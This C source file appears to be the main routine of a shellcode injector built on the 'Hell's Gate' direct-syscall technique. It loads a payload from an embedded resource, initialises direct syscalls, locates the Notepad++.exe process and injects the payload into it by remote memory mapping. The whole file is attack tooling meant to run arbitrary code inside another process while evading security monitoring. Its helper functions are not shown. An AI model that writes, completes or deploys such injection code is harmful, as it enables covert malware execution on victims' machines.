#include "HellsGate.h"
#include "Common.h"

#define TARGET_PROCESS L"Notepad++.exe"

int main() {
	PVOID pPayloadAddress = NULL;
	SIZE_T sPayloadSize = 0;
	DWORD dwPid = 0;
	HANDLE hProcess = NULL;

	// Resource reading
	if (ReadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
		printf("[!] Failed To Read Payload From The Resource\n");
		return -1;
	}
	printf("[+] Read Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
	PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);

	// Init syscalls for use
	InitializeSyscalls();

	// Process enumeration
	printf("[i] Enumerating Processes...\n");
	if (GetRemoteProcessHandle(TARGET_PROCESS, &dwPid, &hProcess) != TRUE) {
		wprintf(L"[!] Failed To Find Target Process %ls\n", TARGET_PROCESS);
		return -1;
	}
	printf("[+] DONE!\n");
	wprintf(L"[+] Found Taget Process: %ls with PID: %d And Handle: %p!\n", TARGET_PROCESS, dwPid, hProcess);

	// Executing payload on the local process
	//RemoteMappingInjectionViaSyscalls(
	//	GetCurrentProcessHandle(),
	//	pPayloadAddress,
	//	sPayloadSize,
	//	TRUE
	//);

	RemoteMappingInjectionViaSyscalls(
		hProcess,
		pPayloadAddress,
		sPayloadSize,
		FALSE
	);

	return 0;
}